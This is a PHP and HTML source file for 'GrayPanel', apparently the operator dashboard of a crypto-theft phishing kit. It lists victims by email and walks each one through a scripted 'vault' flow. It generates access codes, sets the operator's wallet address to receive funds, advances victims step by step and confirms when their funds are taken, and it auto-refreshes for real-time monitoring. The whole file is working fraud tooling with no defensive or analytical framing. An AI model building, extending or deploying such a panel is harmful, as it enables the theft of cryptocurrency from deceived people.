<?php
session_start();
require_once 'db_connection.php';

// Check if admin is logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: login.php");
    exit();
}

// Get all victims currently in vault flow
$stmt = $conn->prepare("SELECT * FROM user_submissions WHERE vault_crypto IS NOT NULL OR vault_status IS NOT NULL OR activity LIKE '%Vault%' ORDER BY updated_at DESC");
$stmt->execute();
$vault_victims = $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
$stmt->close();

// Count statistics
$total_vault = count($vault_victims);
$awaiting_code = 0;
$code_generated = 0;
$completed = 0;

foreach ($vault_victims as $victim) {
    if ($victim['vault_status'] == 'VaultCrypto') $awaiting_code++;
    elseif (!empty($victim['vault_code'])) $code_generated++;
    elseif ($victim['vault_status'] == 'VaultComplete') $completed++;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="../assets/favicon-32x32.png" type="image/x-icon">
    <title>Vault Management - GrayPanel</title>
    <style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}

body {
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    background: #0a0a0a;
    color: #e5e5e5;
    line-height: 1.5;
    overflow-x: hidden;
    position: relative;
}

/* Sharp Star Field Background */
body::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(1px 1px at 20px 30px, #666666, transparent),
        radial-gradient(1px 1px at 40px 70px, #888888, transparent),
        radial-gradient(1px 1px at 90px 40px, #555555, transparent),
        radial-gradient(1px 1px at 130px 80px, #777777, transparent),
        radial-gradient(1px 1px at 160px 30px, #666666, transparent),
        radial-gradient(1px 1px at 200px 90px, #888888, transparent),
        radial-gradient(1px 1px at 240px 20px, #555555, transparent),
        radial-gradient(1px 1px at 280px 60px, #777777, transparent),
        radial-gradient(1px 1px at 320px 100px, #666666, transparent),
        radial-gradient(1px 1px at 360px 40px, #888888, transparent);
    background-repeat: repeat;
    background-size: 400px 200px;
    animation: starMove 120s linear infinite;
    z-index: -1;
    opacity: 0.3;
}

@keyframes starMove {
    from { transform: translateY(0px) translateX(0px); }
    to { transform: translateY(-200px) translateX(-400px); }
}

header {
    background: #111111;
    border-bottom: 2px solid #333333;
    padding: 1rem 2rem;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: relative;
    z-index: 100;
}

.header-left {
    display: flex;
    align-items: center;
    gap: 1.5rem;
}

.brand-logo {
    width: 40px;
    height: 40px;
    background: #666666;
    border: 2px solid #888888;
    display: flex;
    align-items: center;
    justify-content: center;
    font-weight: 700;
    color: #ffffff;
    font-size: 16px;
    font-family: 'Courier New', monospace;
}

.brand-title {
    font-size: 1.4rem;
    font-weight: 600;
    color: #cccccc;
    font-family: 'Courier New', monospace;
    letter-spacing: 1px;
}

.stats-indicator {
    background: #1a1a1a;
    border: 1px solid #444444;
    padding: 0.6rem 1.2rem;
    font-size: 0.85rem;
    color: #aaaaaa;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.buttons-container {
    display: flex;
    gap: 1px;
}

.btn {
    padding: 0.8rem 1.6rem;
    border: 1px solid #444444;
    font-size: 0.875rem;
    font-weight: 500;
    cursor: pointer;
    transition: all 0.2s ease;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.btn-primary {
    background: #333333;
    color: #ffffff;
    border-color: #666666;
}

.btn-secondary {
    background: #222222;
    color: #cccccc;
    border-color: #444444;
}

.btn-danger {
    background: #441111;
    color: #ffffff;
    border-color: #661111;
}

.btn:hover {
    background: #444444;
    border-color: #888888;
}

.btn-danger:hover {
    background: #662222;
    border-color: #882222;
}

main {
    padding: 2rem;
    position: relative;
    z-index: 50;
}

.vault-stats {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
    gap: 1.5rem;
    margin-bottom: 2rem;
}

.stat-card {
    background: #1a1a1a;
    border: 2px solid #333333;
    padding: 1.5rem;
    text-align: center;
}

.stat-card h3 {
    color: #888888;
    font-size: 0.875rem;
    font-weight: 500;
    margin-bottom: 0.5rem;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.stat-card .value {
    font-size: 2.5rem;
    font-weight: 700;
    color: #ffffff;
    font-family: 'Courier New', monospace;
}

.vault-panel {
    background: #111111;
    border: 2px solid #333333;
    margin-bottom: 2rem;
}

.panel-header {
    background: #1a1a1a;
    border-bottom: 1px solid #333333;
    padding: 1rem 1.5rem;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.panel-header h2 {
    font-size: 1.2rem;
    font-weight: 600;
    color: #cccccc;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.panel-badge {
    background: #333333;
    color: #aaaaaa;
    padding: 0.25rem 0.75rem;
    font-size: 0.75rem;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.vault-table {
    width: 100%;
    border-collapse: collapse;
}

.vault-table th,
.vault-table td {
    padding: 1rem 1.5rem;
    text-align: left;
    border-bottom: 1px solid #333333;
    font-family: 'Courier New', monospace;
}

.vault-table th {
    background: #1a1a1a;
    font-weight: 600;
    font-size: 0.75rem;
    color: #888888;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}

.vault-table td {
    font-size: 0.875rem;
    color: #cccccc;
}

.crypto-info {
    display: flex;
    align-items: center;
    gap: 0.5rem;
}

.crypto-info img {
    width: 20px;
    height: 20px;
}

.status-badge {
    padding: 0.25rem 0.75rem;
    font-size: 0.75rem;
    font-weight: 500;
    text-transform: uppercase;
    letter-spacing: 0.5px;
    font-family: 'Courier New', monospace;
}

.status-selecting { background: #444411; color: #ffff88; }
.status-waiting { background: #441111; color: #ff8888; }
.status-access { background: #114444; color: #88ffff; }
.status-complete { background: #114411; color: #88ff88; }

.online-status {
    display: flex;
    align-items: center;
    gap: 0.5rem;
    font-family: 'Courier New', monospace;
    font-size: 0.75rem;
    text-transform: uppercase;
}

.status-dot {
    width: 8px;
    height: 8px;
    border-radius: 50%;
}

.online { background: #88ff88; }
.offline { background: #666666; }

.action-buttons {
    display: flex;
    gap: 0.5rem;
}

.btn-sm {
    padding: 0.4rem 0.8rem;
    font-size: 0.75rem;
}

.btn-warning {
    background: #444411;
    color: #ffff88;
    border-color: #666622;
}

.btn-info {
    background: #114444;
    color: #88ffff;
    border-color: #226666;
}

.btn-success {
    background: #114411;
    color: #88ff88;
    border-color: #226622;
}

.empty-state {
    text-align: center;
    padding: 3rem;
    color: #666666;
    font-family: 'Courier New', monospace;
    text-transform: uppercase;
    letter-spacing: 1px;
}
    </style>
</head>
<body>
    <header>
        <div class="header-left">
            <div class="brand-logo">GP</div>
            <div class="brand-title">VAULT MANAGEMENT</div>
            <div class="stats-indicator">VICTIMS: <?php echo $total_vault; ?></div>
        </div>
        <div class="buttons-container">
            <button class="btn btn-secondary" onclick="window.location.href='dashboard.php'">BACK</button>
            <button class="btn btn-primary" onclick="refreshData()">REFRESH</button>
        </div>
    </header>

    <main>
        <!-- Statistics Grid -->
        <div class="vault-stats">
            <div class="stat-card">
                <h3>Total in Vault</h3>
                <div class="value"><?php echo $total_vault; ?></div>
            </div>
            <div class="stat-card">
                <h3>Awaiting Code</h3>
                <div class="value"><?php echo $awaiting_code; ?></div>
            </div>
            <div class="stat-card">
                <h3>Code Generated</h3>
                <div class="value"><?php echo $code_generated; ?></div>
            </div>
            <div class="stat-card">
                <h3>Completed</h3>
                <div class="value"><?php echo $completed; ?></div>
            </div>
        </div>

        <!-- Vault Victims Table -->
        <div class="vault-panel">
            <div class="panel-header">
                <h2>Vault Victims</h2>
                <div class="panel-badge">REAL-TIME MONITORING</div>
            </div>
            
            <?php if (empty($vault_victims)): ?>
                <div class="empty-state">
                    NO VICTIMS IN VAULT FLOW
                </div>
            <?php else: ?>
                <table class="vault-table">
                    <thead>
                        <tr>
                            <th>Email</th>
                            <th>Crypto</th>
                            <th>Status</th>
                            <th>Access Code</th>
                            <th>Admin Address</th>
                            <th>Last Activity</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php foreach ($vault_victims as $victim): ?>
                            <tr>
                                <td>
                                    <div class="online-status">
                                        <div class="status-dot <?php echo (isset($victim['status']) && $victim['status'] == '1') ? 'online' : 'offline'; ?>"></div>
                                        <?php echo htmlspecialchars($victim['email']); ?>
                                    </div>
                                </td>
                                <td>
                                    <?php if ($victim['vault_crypto']): ?>
                                        <div class="crypto-info">
                                            <img src="../assets/<?php echo strtolower($victim['vault_crypto']); ?>-logo.svg" alt="<?php echo $victim['vault_crypto']; ?>" onerror="this.style.display='none'">
                                            <?php echo strtoupper($victim['vault_crypto']); ?>
                                        </div>
                                    <?php else: ?>
                                        <span class="status-badge status-selecting">SELECTING CRYPTO</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <?php 
                                    $status = $victim['vault_status'] ?? 'VaultPage';
                                    $statusClass = 'status-selecting';
                                    $statusText = 'SELECTING';
                                    
                                    switch($status) {
                                        case 'VaultCrypto':
                                            $statusClass = 'status-waiting';
                                            $statusText = 'AWAITING CODE';
                                            break;
                                        case 'VaultAccess':
                                            $statusClass = 'status-access';
                                            $statusText = 'ENTERING CODE';
                                            break;
                                        case 'VaultWallet':
                                            $statusClass = 'status-access';
                                            $statusText = 'WALLET INPUT';
                                            break;
                                        case 'VaultComplete':
                                            $statusClass = 'status-complete';
                                            $statusText = 'COMPLETE';
                                            break;
                                    }
                                    ?>
                                    <span class="status-badge <?php echo $statusClass; ?>"><?php echo $statusText; ?></span>
                                </td>
                                <td>
                                    <?php if ($victim['vault_code']): ?>
                                        <span style="font-weight: bold; color: #88ff88;"><?php echo $victim['vault_code']; ?></span>
                                    <?php else: ?>
                                        <span style="color: #666666;">NOT GENERATED</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <?php if (isset($victim['vault_admin_address']) && $victim['vault_admin_address']): ?>
                                        <span style="font-size: 0.75rem; color: #88ffff;"><?php echo substr($victim['vault_admin_address'], 0, 20) . '...'; ?></span>
                                    <?php else: ?>
                                        <span style="color: #ff8888;">NOT SET</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <?php 
                                    if (isset($victim['updated_at'])) {
                                        echo date('H:i:s', strtotime($victim['updated_at']));
                                    } else {
                                        echo '00:00:00';
                                    }
                                    ?>
                                </td>
                                <td>
                                    <div class="action-buttons">
                                        <?php if (!$victim['vault_code']): ?>
                                            <button class="btn btn-warning btn-sm" onclick="generateCode('<?php echo $victim['token']; ?>')">GENERATE CODE</button>
                                        <?php endif; ?>
                                        
                                        <?php if (!isset($victim['vault_admin_address']) || !$victim['vault_admin_address']): ?>
                                            <button class="btn btn-info btn-sm" onclick="setAddress('<?php echo $victim['token']; ?>')">SET ADDRESS</button>
                                        <?php endif; ?>
                                        
                                        <?php if ($status === 'VaultComplete'): ?>
                                            <button class="btn btn-success btn-sm" onclick="confirmFunds('<?php echo $victim['token']; ?>')">CONFIRM FUNDS</button>
                                        <?php else: ?>
                                            <button class="btn btn-success btn-sm" onclick="nextStep('<?php echo $victim['token']; ?>')">NEXT STEP</button>
                                        <?php endif; ?>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            <?php endif; ?>
        </div>
    </main>

    <script>
        function refreshData() {
            location.reload();
        }

        function generateCode(token) {
            fetch('vault_actions.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=generate_code&token=' + encodeURIComponent(token)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('ACCESS CODE GENERATED: ' + data.code);
                    location.reload();
                } else {
                    alert('ERROR: ' + data.message);
                }
            });
        }

        function setAddress(token) {
            const address = prompt('ENTER ADMIN WALLET ADDRESS:');
            if (address) {
                fetch('vault_actions.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: 'action=set_address&token=' + encodeURIComponent(token) + '&address=' + encodeURIComponent(address)
                })
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        alert('ADMIN ADDRESS SET SUCCESSFULLY');
                        location.reload();
                    } else {
                        alert('ERROR: ' + data.message);
                    }
                });
            }
        }

        function nextStep(token) {
            fetch('vault_actions.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=next_step&token=' + encodeURIComponent(token)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('VICTIM MOVED TO NEXT STEP');
                    location.reload();
                } else {
                    alert('ERROR: ' + data.message);
                }
            });
        }

        function confirmFunds(token) {
            fetch('vault_actions.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'action=confirm_funds&token=' + encodeURIComponent(token)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    alert('FUNDS CONFIRMED - VICTIM COMPLETED');
                    location.reload();
                } else {
                    alert('ERROR: ' + data.message);
                }
            });
        }

        // Auto-refresh every 10 seconds
        setInterval(refreshData, 10000);
    </script>
</body>
</html>